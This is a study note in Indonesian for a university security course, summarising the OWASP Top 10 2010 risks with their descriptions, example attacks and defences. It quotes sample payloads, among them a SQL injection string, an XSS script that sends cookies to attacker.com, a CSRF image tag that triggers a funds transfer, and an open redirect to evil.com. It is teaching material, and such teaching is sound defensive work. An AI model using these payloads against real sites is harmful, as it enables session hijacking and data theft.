---
type: Note
cssclasses:
  - cornell-notes
---

_Back to_ [[IF5161 Keamanan Data dan Perangkat Lunak]]

> [!cornell] OWASP Top 10 2010
>
> > ## Questions/Cues
> >
> > - Apa pergeseran filosofi utama edisi 2010 (risiko vs kelemahan/prevalensi)?
> > - Apa 10 risiko 2010 beserta rating Exploitability/Prevalence/Detectability/Impact-nya?
> > - Tiga perubahan besar apa dari [[OWASP Top 10 2007]] ke 2010?
> > - Mengapa Malicious File Execution dan Information Leakage & Improper Error Handling dihapus?
> > - Contoh skenario serangan untuk Insecure Cryptographic Storage dan Insufficient Transport Layer Protection?
> >
> > ## Reference Points
> >
> > - IF5161 — OWASP Top 10 - 2010: The Ten Most Critical Web Application Security Risks
> > - IF5161 — GitHub OWASP/Top10 — `2010/OWASP Top 10 - 2010 English.pdf` (Halaman 6-20)
>
> > ### Konteks & Metodologi
> >
> > **OWASP Top 10 - 2010** adalah **pembaruan signifikan yang menjadikan daftar ini eksplisit tentang _risiko_**, bukan hanya "kerentanan paling umum". *"OWASP Top 10 selalu tentang risiko, tetapi pembaruan ini membuatnya jauh lebih jelas dari edisi sebelumnya."* Untuk tiap item, edisi ini membahas **faktor _likelihood_ & _consequence_** yang dipakai untuk mengkategorikan tingkat keparahan risiko, lalu memberi panduan verifikasi, cara menghindari, contoh cacat, dan tautan.
> >
> > **Tahun ke-8 proyek** (pertama rilis **2003**, update minor **2004** & **2007**). *"Top 10 bukan program keamanan aplikasi"* — OWASP menyarankan organisasi membangun fondasi **pelatihan, standar, dan tools**, lalu mengintegrasikan keamanan ke proses pengembangan/verifikasi/maintenance.
> >
> > **Kontributor data 2010:** Aspect Security, **MITRE – CVE**, Softtek, **WhiteHat Security Inc.** (statistik).
> >
> > **Skala risiko OWASP** (per risiko, dari perspektif *Application Specific*): empat sumbu berlabel — **Exploitability** (Easy / Average / Difficult), **Weakness Prevalence** (Widespread / Common / Uncommon), **Weakness Detectability** (Easy / Average / Difficult), **Technical Impact** (Severe / Moderate / Minor).
> >
> > ### Daftar OWASP Top 10 2010
> >
> > | # | Kategori | Exploit / Prevalence / Detect / Impact | Deskripsi singkat (dari dokumen) |
> > |---|---|---|---|
> > | **A1** | Injection | Easy / Common / Average / Severe | Data tak tepercaya dikirim ke interpreter (SQL, OS, LDAP) sebagai bagian perintah/query |
> > | **A2** | Cross-Site Scripting (XSS) | Average / Very Widespread / Easy / Moderate | Data tak tepercaya dikirim ke browser tanpa validasi/escaping |
> > | **A3** | Broken Authentication and Session Management | Average / Common / Average / Severe | Fungsi autentikasi & sesi salah implementasi → kompromi password/kunci/token |
> > | **A4** | Insecure Direct Object References | Easy / Common / Easy / Moderate | Referensi objek internal (file, direktori, key DB) diekspos tanpa cek akses |
> > | **A5** | Cross-Site Request Forgery (CSRF) | Average / Widespread / Easy / Moderate | Browser korban yang login dipaksa mengirim request HTTP palsu |
> > | **A6** | Security Misconfiguration **(NEW)** | Easy / Common / Easy / Moderate | Konfigurasi aman tidak didefinisikan/diterapkan/dipelihara; default sering tak aman |
> > | **A7** | Insecure Cryptographic Storage | Difficult / Uncommon / Difficult / Severe | Data sensitif tak dilindungi enkripsi/hashing yang tepat |
> > | **A8** | Failure to Restrict URL Access | Easy / Uncommon / Average / Moderate | Hak akses URL dicek saat me-render link tetapi tidak saat halaman diakses |
> > | **A9** | Insufficient Transport Layer Protection | Difficult / Common / Easy / Moderate | Trafik jaringan sensitif tak diautentikasi/dienkripsi/dilindungi dengan benar |
> > | **A10** | Unvalidated Redirects and Forwards **(NEW)** | Average / Uncommon / Easy / Moderate | Redirect/forward memakai data tak tepercaya untuk menentukan tujuan |
> >
> > ```mermaid
> > flowchart LR
> >     subgraph S2007["2007"]
> >         O1["A1 XSS"]
> >         O2["A2 Injection Flaws"]
> >         O3["A3 Malicious File Execution"]
> >         O4["A4 Insecure Direct Object Reference"]
> >         O5["A5 CSRF"]
> >         O6["A6 Information Leakage &amp; Improper Error Handling"]
> >         O7["A7 Broken Authentication &amp; Session Mgmt"]
> >         O8["A8 Insecure Cryptographic Storage"]
> >         O9["A9 Insecure Communications"]
> >         O10["A10 Failure to Restrict URL Access"]
> >     end
> >     subgraph S2010["2010"]
> >         N1["A1 Injection"]
> >         N2["A2 XSS"]
> >         N3["A3 Broken Authentication &amp; Session Mgmt"]
> >         N4["A4 Insecure Direct Object References"]
> >         N5["A5 CSRF"]
> >         N6["A6 Security Misconfiguration (NEW)"]
> >         N7["A7 Insecure Cryptographic Storage"]
> >         N8["A8 Failure to Restrict URL Access"]
> >         N9["A9 Insufficient Transport Layer Protection"]
> >         N10["A10 Unvalidated Redirects &amp; Forwards (NEW)"]
> >     end
> >     O2 --> N1
> >     O1 --> N2
> >     O7 --> N3
> >     O4 --> N4
> >     O5 --> N5
> >     O8 --> N7
> >     O10 --> N8
> >     O9 -- "rename" --> N9
> >     O3 -- "dihapus (PHP kini aman by default)" --> X3["dihapus"]
> >     O6 -- "dilipat ke A6" --> N6
> > ```
> >
> > ### A1 — Injection
> >
> > **Deskripsi.** *Injection flaw* (SQL, OS, LDAP) terjadi ketika aplikasi mengirim data tak tepercaya ke interpreter sebagai bagian perintah/query. Sangat lazim di *legacy code* — query SQL/LDAP/XPath, perintah OS, argumen program. **Mudah ditemukan lewat review kode**, lebih sulit lewat pengujian. Dampak: kehilangan/korupsi data, hilangnya *accountability*, penolakan akses, kadang **pengambilalihan host penuh**.
> >
> > **Am I Vulnerable?** Verifikasi setiap penggunaan interpreter **memisahkan data tak tepercaya dari perintah/query**. Untuk SQL: pakai *bind variable* di semua *prepared statement* & *stored procedure*, hindari *dynamic query*. Cek kode = cara cepat & akurat.
> >
> > **Contoh Skenario Serangan.** `String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";` Penyerang mengubah `id` menjadi `' or '1'='1` → `http://example.com/app/accountView?id=' or '1'='1`, membuat query mengembalikan **semua record** tabel `accounts`. Dalam kasus terburuk penyerang memanggil **stored procedure khusus** untuk **mengambil alih database dan bahkan server**-nya.
> >
> > **How Do I Prevent?**
> >
> > 1. **Safe API / parameterized interface** (hati-hati *stored procedure* yang tetap bisa injeksi "di balik layar").
> > 2. Bila tak ada: **escape karakter khusus** sesuai sintaks interpreter (OWASP **ESAPI**).
> > 3. **Validasi input positif ("white list") + kanonikalisasi** — bukan pertahanan lengkap.
> >
> > ### A2 — Cross-Site Scripting (XSS)
> >
> > **Deskripsi.** **Cacat keamanan aplikasi web paling prevalen.** Terjadi ketika aplikasi menyertakan data pengguna dalam halaman ke browser **tanpa validasi/escaping**. Tiga tipe: **Stored, Reflected, DOM based**. Dampak: pembajakan sesi, defacement, penyisipan konten jahat, redirect, pembajakan browser via malware.
> >
> > **Am I Vulnerable?** Pastikan semua input pengguna yang dikirim balik ke browser **diverifikasi aman (validasi input)** dan **di-escape** sebelum dimasukkan ke halaman output. Web 2.0 (AJAX) membuat XSS jauh lebih sulit dideteksi alat otomatis → butuh **kombinasi review kode manual + pentest manual**.
> >
> > **Contoh Skenario Serangan.** `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";` Penyerang mengubah `CC` menjadi `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'` → session ID korban dikirim ke situs penyerang → sesi dibajak. (XSS juga bisa mengalahkan pertahanan **CSRF** otomatis — lih. A5.)
> >
> > **How Do I Prevent?**
> >
> > 1. **Escape semua data tak tepercaya berdasarkan konteks HTML** (body, atribut, JavaScript, CSS, URL).
> > 2. **Validasi input positif ("whitelist")** — dekode dulu input ter-encode, lalu validasi panjang/karakter/format.
> > 3. Pertimbangkan **Content Security Policy** (yang akan hadir di Firefox 4).
> >
> > ### A3 — Broken Authentication and Session Management
> >
> > **Deskripsi.** Fungsi autentikasi & sesi **sering dibangun kustom** dan sulit dibuat benar — cacat di *logout, password management, timeout, remember me, secret question, account update*. Aset utama yang dilindungi: **kredensial & session ID**. Dampak: sebagian/semua akun bisa diserang; akun *privileged* jadi target utama.
> >
> > **Am I Vulnerable?**
> >
> > 1. Kredensial selalu dilindungi hashing/enkripsi saat disimpan? (lih. A7)
> > 2. Kredensial bisa ditebak/ditimpa lewat fungsi manajemen akun lemah?
> > 3. **Session ID di URL** (URL rewriting)?
> > 4. Session ID rentan **session fixation**?
> > 5. Session ID **timeout** & user bisa logout?
> > 6. Session ID **di-rotasi** setelah login sukses?
> > 7. Password/session ID dikirim **hanya lewat TLS**? (lih. A9)
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi reservasi maskapai memakai *URL rewriting*, menaruh session ID di URL: `http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii`. User mengirim tautan ke teman tanpa sadar juga memberi session ID (dan kartu kreditnya).
> > 2. *Timeout* tak diset benar — user di komputer publik menutup tab tanpa "logout"; penyerang memakai browser sama satu jam kemudian, masih terautentikasi.
> > 3. *Insider*/penyerang eksternal mengakses **database password** yang **tidak dienkripsi** → semua password terekspos.
> >
> > **How Do I Prevent?** Sediakan bagi developer **satu set kontrol autentikasi & manajemen sesi yang kuat** yang: (a) memenuhi **OWASP ASVS V2 & V3**; (b) punya antarmuka sederhana (contoh: ESAPI Authenticator & User API). Hindari **XSS** yang bisa dipakai mencuri session ID (lih. A2).
> >
> > ### A4 — Insecure Direct Object References
> >
> > **Deskripsi.** Developer **mengekspos referensi ke objek implementasi internal** (file, direktori, key database); aplikasi tidak selalu memverifikasi otorisasi user terhadap objek target. Tester **mudah** memanipulasi nilai parameter; *code analysis* cepat menunjukkan apakah otorisasi diverifikasi. Dampak: kompromi semua data yang dapat dirujuk parameter itu.
> >
> > **Am I Vulnerable?** (1) Untuk referensi langsung ke sumber daya terbatas, aplikasi perlu memverifikasi user **berwenang atas sumber daya persis** yang diminta. (2) Untuk referensi tidak langsung, pemetaannya **harus dibatasi** ke nilai yang diizinkan untuk user saat ini.
> >
> > **Contoh Skenario Serangan.** `String query = "SELECT * FROM accts WHERE account = ?"; pstmt.setString(1, request.getParameter("acct")); ResultSet results = pstmt.executeQuery();` Penyerang mengubah parameter `acct` di browser → `http://example.com/app/accountInfo?acct=notmyacct` → mengakses akun user mana pun.
> >
> > **How Do I Prevent?**
> >
> > 1. **Referensi objek tidak langsung per user/sesi** — mis. *drop-down* enam sumber daya memakai angka 1–6; server memetakan kembali ke key database asli (OWASP **ESAPI** menyediakan *access reference map* sekuensial & acak).
> > 2. **Cek akses** — setiap penggunaan referensi objek langsung dari sumber tak tepercaya wajib melewati **cek kontrol akses**.
> >
> > ### A5 — Cross-Site Request Forgery (CSRF)
> >
> > **Deskripsi.** Serangan CSRF **memaksa browser korban yang login** mengirim **request HTTP palsu** — termasuk *session cookie* dan info autentikasi lain yang otomatis disertakan — sehingga aplikasi mengira request itu **sah dari korban**. CSRF memanfaatkan fakta bahwa aplikasi web mengizinkan penyerang **memprediksi semua detail sebuah aksi**. Deteksi cukup mudah lewat pentest / *code analysis*.
> >
> > **Am I Vulnerable?** Cek apakah tiap link & form berisi **token tak terprediksi per user**. Session cookie, IP sumber, dan info lain yang otomatis dikirim browser **tidak dihitung** (juga disertakan di request palsu). Fokus pada link/form pengubah *state*; cek transaksi multi-langkah.
> >
> > **Contoh Skenario Serangan.** Aplikasi mengizinkan request pengubah *state* tanpa unsur rahasia: `http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243`. Penyerang menyusun request transfer ke rekeningnya lalu menanamnya di `<img>`/iframe: `<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#" width="0" height="0" />`. Jika korban mengunjungi situs penyerang **sambil masih login** ke example.com, request palsu otomatis menyertakan info sesi korban.
> >
> > **How Do I Prevent?** Sertakan **token tak terprediksi** di *body* atau URL setiap request HTTP (minimal unik per sesi user, bisa juga per request):
> >
> > 1. **Utama:** token di *hidden field* → terkirim di *body*, bukan URL.
> > 2. Token bisa juga di URL — tetapi lebih berisiko terekspos.
> >
> > OWASP **CSRFGuard** menyisipkan token otomatis di aplikasi Java EE/.NET/PHP; ESAPI menyediakan *token generator & validator*.
> >
> > ### A6 — Security Misconfiguration **(kategori baru 2010)**
> >
> > **Deskripsi.** Kembali masuk Top 10: dulu **A10:2004 _Insecure Configuration Management_**, dihapus 2007 karena dianggap bukan isu *software* — tetapi dari sudut **risiko organisasi & prevalensi**, jelas layak masuk lagi. Keamanan yang baik menuntut **konfigurasi aman yang didefinisikan & di-deploy** untuk aplikasi, framework, app server, web server, database server, dan platform; **banyak default tidak aman**. Termasuk **menjaga semua software (dan _code library_) tetap mutakhir**. Bisa terjadi di **level mana pun** stack.
> >
> > **Am I Vulnerable?**
> >
> > 1. Ada proses menjaga semua software mutakhir? (OS, Web/App Server, DBMS, aplikasi, semua *code library*)
> > 2. Semua yang tak perlu **dinonaktifkan/dihapus/tak diinstal**? (port, servis, halaman, akun, privilege)
> > 3. Password akun default **diganti/dinonaktifkan**?
> > 4. *Error handling* mencegah kebocoran **stack trace** & pesan berlebihan?
> > 5. Setelan keamanan di framework (Struts, Spring, ASP.NET) & library dipahami & dikonfigurasi benar?
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi bergantung pada **framework kuat (Struts/Spring)**; celah XSS ditemukan di komponen framework itu; *update* dirilis tetapi library **tidak diperbarui** → penyerang mudah mengeksploitasinya.
> > 2. Konsol admin app server terinstal otomatis & tidak dihapus; akun default tak diganti → penyerang login & mengambil alih.
> > 3. **Directory listing tidak dinonaktifkan** → penyerang meng-*list* direktori, mengunduh kelas Java terkompilasi, men-*reverse*, dan menemukan celah kontrol akses serius.
> > 4. Konfigurasi app server mengizinkan **stack trace** dikembalikan ke user → membocorkan celah yang mendasari.
> >
> > **How Do I Prevent?**
> >
> > 1. **Proses hardening yang dapat diulang & terotomasi**; dev/QA/prod dikonfigurasi identik.
> > 2. Proses **update & patch** tepat waktu ke tiap environment — termasuk semua *code library* (yang sering terlupa).
> > 3. **Arsitektur aplikasi kuat** dengan pemisahan & keamanan antar-komponen.
> > 4. **Scan & audit berkala**.
> >
> > ### A7 — Insecure Cryptographic Storage
> >
> > **Deskripsi.** Banyak aplikasi web **tidak melindungi data sensitif** (kartu kredit, SSN, kredensial autentikasi) dengan enkripsi/hashing yang tepat. Cacat paling umum: **tidak mengenkripsi data yang seharusnya dienkripsi**. Bila enkripsi dipakai, umum ditemukan **key generation & storage yang tak aman, kunci tidak dirotasi, dan algoritma lemah**; juga **hash password lemah atau tanpa salt**. *"Penyerang biasanya tidak membobol kripto"* — mereka mencari kunci, mendapat salinan *cleartext*, atau mengakses data lewat kanal yang otomatis mendekripsi.
> >
> > **Am I Vulnerable?** Tentukan data mana yang cukup sensitif untuk dienkripsi. Untuk semua data itu, pastikan:
> >
> > 1. **Dienkripsi di mana pun disimpan jangka panjang**, terutama di *backup*.
> > 2. Hanya user berwenang bisa mengakses salinan yang sudah didekripsi (kontrol akses — lih. A4 & A8).
> > 3. **Algoritma enkripsi standar yang kuat** dipakai.
> > 4. **Kunci kuat** dibuat, dilindungi dari akses tak berwenang, dan **rencana perubahan kunci** ada.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi mengenkripsi kartu kredit di database, tetapi **database otomatis mendekripsi** query ke kolom kartu kredit → celah **SQL injection** mengambil semua kartu dalam *cleartext*. Seharusnya hanya aplikasi **back-end** yang boleh mendekripsi, bukan aplikasi web *front-end*.
> > 2. **Backup tape** rekam medis terenkripsi dibuat, tetapi **kunci enkripsi ada di tape yang sama**; tape tak pernah sampai ke pusat backup.
> > 3. Database password memakai **hash tanpa salt** → celah *file upload* → penyerang mengambil file password → semua hash tanpa salt **di-brute force dalam 4 minggu**, sedangkan hash ber-salt yang benar butuh **> 3000 tahun**.
> >
> > **How Do I Prevent?** Minimal:
> >
> > 1. **Enkripsi semua data sensitif at rest** sesuai ancaman yang direncanakan (*insider*, user eksternal).
> > 2. Pastikan **backup offsite terenkripsi**, dengan **kunci dikelola & di-backup terpisah**.
> > 3. **Algoritma standar kuat + kunci kuat + manajemen kunci** yang benar.
> > 4. Password **di-hash dengan algoritma standar kuat + salt** yang sesuai.
> > 5. Semua **kunci & password** dilindungi dari akses tak berwenang.
> >
> > ### A8 — Failure to Restrict URL Access
> >
> > **Deskripsi.** Banyak aplikasi mengecek hak akses URL **sebelum me-render link & tombol terproteksi**, tetapi tidak mengulang cek akses **setiap kali halaman itu diakses** → penyerang bisa **memalsukan URL** untuk mengakses halaman tersembunyi. Kadang proteksi dikelola via konfigurasi (dan salah setel), kadang developer **lupa** menambahkan cek kode. Deteksi mudah; bagian tersulit: mengidentifikasi URL/halaman mana yang ada untuk diserang.
> >
> > **Am I Vulnerable?** Untuk tiap halaman: apakah publik atau privat? Jika privat: (1) **autentikasi dibutuhkan** untuk mengaksesnya? (2) apakah boleh diakses **user terautentikasi mana pun**? jika tidak, apakah ada **cek otorisasi**? Verifikasi mekanisme keamanan eksternal (yang menyediakan autentikasi/otorisasi) **dikonfigurasi benar untuk tiap halaman**.
> >
> > **Contoh Skenario Serangan.** Penyerang **force browse** ke URL target: `http://example.com/app/getappInfo` dan `http://example.com/app/admin_getappInfo` (butuh hak admin). Jika penyerang tak terautentikasi mendapat akses ke salah satu → akses tak berwenang; jika user non-admin terautentikasi bisa akses `admin_getappInfo` → cacat, dan bisa mengarah ke halaman admin lain yang tak terproteksi. Cacat ini sering muncul saat **link & tombol sekadar tidak ditampilkan** ke user tak berwenang, tetapi halaman targetnya tidak dilindungi.
> >
> > **How Do I Prevent?**
> >
> > 1. Kebijakan autentikasi & otorisasi **berbasis peran (role based)**.
> > 2. Kebijakan **sangat dapat dikonfigurasi** — minimalkan aspek yang di-*hard code*.
> > 3. Mekanisme penegakan **deny all by default**, butuh *grant* eksplisit ke user & peran tertentu untuk tiap halaman.
> > 4. Bila halaman bagian dari *workflow*, cek kondisi *state* sudah benar.
> >
> > ### A9 — Insufficient Transport Layer Protection
> >
> > **Deskripsi.** Aplikasi sering **gagal mengautentikasi, mengenkripsi, dan melindungi kerahasiaan & integritas trafik jaringan sensitif**. Kalaupun memakai SSL/TLS, sering hanya **saat autentikasi**, bukan di tempat lain — mengekspos data & session ID untuk *interception*. Sertifikat **kedaluwarsa / salah konfigurasi** juga umum. Deteksi cacat dasar mudah (cukup amati trafik jaringan situs).
> >
> > **Am I Vulnerable?** Verifikasi:
> >
> > 1. **SSL dipakai untuk semua trafik terkait autentikasi.**
> > 2. **SSL dipakai untuk semua sumber daya di semua halaman & servis privat** — hindari *mixed SSL* pada satu halaman (memicu peringatan browser & bisa mengekspos session ID).
> > 3. **Hanya algoritma kuat** yang didukung.
> > 4. Semua **session cookie ber-flag `secure`** sehingga browser tak pernah mengirimnya dalam *clear*.
> > 5. **Sertifikat server sah & terkonfigurasi benar** (issuer resmi, tidak kedaluwarsa, tidak dicabut, cocok dengan semua domain situs).
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Situs **tidak memakai SSL untuk semua halaman** yang butuh autentikasi. Penyerang memantau trafik (Wi-Fi terbuka / jaringan kabel lingkungan), mengamati *session cookie* korban terautentikasi, lalu **memutar ulang cookie** & mengambil alih sesi.
> > 2. Situs punya **sertifikat SSL salah konfigurasi** → browser terus memberi peringatan → user terbiasa menerimanya. **Phishing** ke situs tiruan tanpa sertifikat valid menimbulkan peringatan serupa; karena terbiasa, korban lanjut dan memberikan password.
> > 3. Situs memakai **ODBC/JDBC standar** untuk koneksi database, tak menyadari **semua trafik dalam _clear_**.
> >
> > **How Do I Prevent?** Minimal:
> >
> > 1. **Wajibkan SSL untuk semua halaman sensitif**; request non-SSL ke halaman ini di-*redirect* ke halaman SSL.
> > 2. Set **flag `secure`** pada semua cookie sensitif.
> > 3. Konfigurasi penyedia SSL untuk **hanya mendukung algoritma kuat** (mis. patuh **FIPS 140-2**).
> > 4. Pastikan **sertifikat valid** — tidak kedaluwarsa, tidak dicabut, cocok dengan semua domain.
> > 5. **Koneksi back-end** juga memakai SSL / teknologi enkripsi lain.
> >
> > ### A10 — Unvalidated Redirects and Forwards **(kategori baru 2010)**
> >
> > **Deskripsi.** **Debut di Top 10.** Aplikasi web sering **me-*redirect* & *forward*** pengguna ke halaman/situs lain memakai **data tak tepercaya** untuk menentukan tujuan. Tanpa validasi, penyerang bisa **mengarahkan korban ke situs phishing/malware**, atau memakai *forward* untuk mengakses halaman tak berwenang. *Redirect* tak dicek mudah dideteksi (URL penuh bisa di-set); *forward* lebih sulit (menargetkan halaman internal).
> >
> > **Am I Vulnerable?** (1) Review kode untuk semua penggunaan *redirect*/*forward* (*transfer* di .NET) — apakah URL tujuan dari parameter & **tidak divalidasi** hanya berisi tujuan yang diizinkan? (2) *Spider* situs untuk melihat *redirect* (HTTP 300-307, biasanya 302). (3) Bila kode tak tersedia, uji semua parameter yang tampak seperti URL tujuan.
> >
> > **Contoh Skenario Serangan.**
> >
> > 1. Aplikasi punya halaman `redirect.jsp` dengan satu parameter `url`. Penyerang menyusun URL jahat yang mengarahkan pengguna ke situs jahat (phishing + malware): `http://www.example.com/redirect.jsp?url=evil.com`.
> > 2. Aplikasi memakai *forward* untuk merutekan request; sebagian halaman memakai parameter tujuan setelah transaksi sukses. Penyerang menyusun URL yang **lolos cek kontrol akses** lalu di-*forward* ke fungsi administratif yang tak berwenang: `http://www.example.com/boring.jsp?fwd=admin.jsp`.
> >
> > **How Do I Prevent?**
> >
> > 1. **Hindari** *redirect* & *forward* sama sekali.
> > 2. Bila dipakai, **jangan libatkan parameter pengguna** dalam menghitung tujuan.
> > 3. Bila parameter tujuan tak terhindarkan, **validasi nilainya** & pastikan berwenang untuk user — disarankan berupa **nilai pemetaan**, bukan URL asli; server menerjemahkannya ke URL target (ESAPI bisa meng-*override* `sendRedirect()`).
> >
> > ### Perubahan dari Edisi 2007
> >
> > **Tiga perubahan besar:**
> >
> > 1. **Klarifikasi:** Top 10 adalah **Top 10 _Risiko_**, bukan Top 10 kelemahan paling umum.
> > 2. **Metodologi peringkat diubah** — **mengestimasi risiko**, bukan hanya bergantung pada **frekuensi** kelemahan terkait. Ini mengubah urutan Top 10.
> > 3. **Dua item ditukar:**
> >    - **DITAMBAH — A6 Security Misconfiguration**: dulu A10:2004 *Insecure Configuration Management*, dihapus 2007 karena dianggap bukan isu software; kembali karena risiko organisasi & prevalensi.
> >    - **DITAMBAH — A10 Unvalidated Redirects and Forwards**: debut; bukti menunjukkan isu yang relatif tak dikenal ini **tersebar luas & bisa menimbulkan kerusakan signifikan**.
> >    - **DIHAPUS — A3:2007 Malicious File Execution**: masih masalah nyata, tetapi prevalensinya di 2007 **membengkak karena banyak aplikasi PHP**; PHP kini dikirim dengan **konfigurasi default lebih aman**.
> >    - **DIHAPUS — A6:2007 Information Leakage and Improper Error Handling**: sangat prevalen, tetapi **dampak membocorkan stack trace biasanya minimal**; dengan hadirnya Security Misconfiguration, penanganan error yang benar menjadi bagian dari konfigurasi aman.

> [!cornell] #### Summary
>
> **OWASP Top 10 - 2010** adalah edisi yang **menjadikan daftar ini eksplisit tentang _risiko_**: metodologi peringkat berpindah dari sekadar **frekuensi kelemahan** ke **estimasi risiko** (Exploitability × Prevalence × Detectability × Impact), berdasarkan data Aspect Security, **MITRE/CVE**, Softtek, dan WhiteHat. **Injection** naik ke **#1** (menukar posisi dengan **XSS**). Dua kategori baru: **A6 Security Misconfiguration** (kembali dari A10:2004) dan **A10 Unvalidated Redirects and Forwards** (debut). Dua kategori 2007 dihapus: **Malicious File Execution** (PHP kini aman *by default*) dan **Information Leakage and Improper Error Handling** (dampak minimal; diserap ke Security Misconfiguration). Edisi ini menjadi basis [[OWASP Top 10 2013]], yang kemudian menaikkan Broken Authentication, menurunkan CSRF, dan melebur *Insecure Cryptographic Storage* + *Insufficient Transport Layer Protection* menjadi **Sensitive Data Exposure**. Lihat pendahulunya di [[OWASP Top 10 2007]].

> [!ad-libitum]- Additional Information
>
> #### Nasib kategori 2010 di edisi berikutnya (konteks tambahan, bukan dari dokumen 2010)
>
> | 2010 | 2013 |
> |---|---|
> | A7 Insecure Cryptographic Storage | Digabung → A6:2013 Sensitive Data Exposure |
> | A9 Insufficient Transport Layer Protection | Digabung → A6:2013 Sensitive Data Exposure |
> | A8 Failure to Restrict URL Access | Diperluas → A7:2013 Missing Function Level Access Control |
> | A5 CSRF | Turun → A8:2013 |
> | A3 Broken Authentication and Session Management | Naik → A2:2013 |
> | (buried in A6 Security Misconfiguration) | Dikeluarkan → A9:2013 Using Known Vulnerable Components |
>
> #### Titik balik metodologi
>
> Edisi 2010 memperkenalkan tabel **Threat Agents → Attack Vectors → Security Weakness → Technical/Business Impacts** yang bertahan hingga edisi 2013 & 2017. Sebelum 2010, urutan Top 10 lebih banyak ditentukan **seberapa sering** sebuah kelemahan muncul; sejak 2010, **dampak & kemudahan eksploitasi** ikut menimbang — sehingga kelemahan langka tetapi berdampak besar (mis. *Insecure Cryptographic Storage*) bisa masuk daftar.
>
> #### Proyek Eksplorasi Mandiri
>
> 1. Bandingkan tabel pemetaan "2007 → 2010" dan "2010 → 2013"; buat satu diagram alur besar evolusi kategori 2007–2013.
> 2. Uji konfigurasi TLS sebuah situs dengan **SSL Labs Server Test** (dirujuk dokumen) dan petakan temuan ke checklist A9.
> 3. Reproduksi skenario *Insecure Cryptographic Storage* — buat tabel password ber-hash tanpa salt lalu bandingkan waktu *cracking* dengan versi ber-salt + Argon2.
>
> #### Bacaan Lanjutan
>
> - OWASP Top 10 - 2010 (PDF resmi) — GitHub `OWASP/Top10/2010/`.
> - OWASP ASVS (V2, V3, V4, V5, V6, V7, V10, V12), OWASP ESAPI, OWASP SAMM.
> - OWASP Cheat Sheet: Transport Layer Protection, Cryptographic Storage, CSRF Prevention, XSS Prevention.
